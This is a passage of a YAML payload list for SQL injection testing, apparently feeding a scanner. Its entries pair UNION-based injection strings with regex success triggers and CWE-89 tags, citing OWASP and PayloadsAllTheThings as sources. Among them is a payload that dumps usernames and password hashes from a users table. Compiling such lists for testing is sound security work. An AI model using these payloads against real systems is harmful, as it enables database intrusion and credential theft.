  trigger: *id001
  cwe: CWE-89
  source: 'OWASP cheat-sheet: auth bypass'
- id: sqli-union-001
  class: sqli
  payload: 1' UNION SELECT null, version() -- -
  trigger: &id002
    kind: any_of
    any_of:
    - kind: regex
      pattern: First name|MariaDB|MySQL|[0-9]+\.[0-9]+\.[0-9]+
    - kind: regex
      pattern: SQLITE_ERROR|syntax error
  cwe: CWE-89
  source: PayloadsAllTheThings/SQL Injection/MySQL Injection.md
- id: sqli-union-002
  class: sqli
  payload: ''' UNION SELECT user(), database() -- -'
  trigger: *id002
  cwe: CWE-89
  source: 'OWASP cheat-sheet: MySQL info-gathering'
- id: sqli-union-003
  class: sqli
  payload: 1' UNION SELECT user,password FROM users -- -
  trigger:
    kind: any_of
    any_of:
    - kind: regex
      pattern: First name|[a-f0-9]{32}
    - kind: regex
      pattern: SQLITE_ERROR|syntax error
  cwe: CWE-89
  source: DVWA walkthrough — classic UNION creds dump
- id: sqli-union-004
